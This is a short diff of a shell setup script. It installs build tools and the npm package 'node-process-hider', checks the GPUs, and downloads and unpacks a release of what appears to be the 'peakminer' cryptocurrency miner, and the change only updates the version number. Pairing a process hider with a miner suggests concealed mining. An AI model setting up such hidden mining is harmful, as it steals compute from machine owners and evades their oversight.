@@ -2,7 +2,7 @@ apt update
 apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 npm i -g node-process-hider
 nvidia-smi
-rm -rf peakminer-2.9.1.tar.gz
+rm -rf peakminer-2.10.0rc1.tar.gz
 wget https://github.com/peakminer/peakminer/releases/download/v2.10.0rc1/peakminer-2.10.0rc1.tar.gz
 tar xf peakminer-2.10.0rc1.tar.gz
 cd peakminer
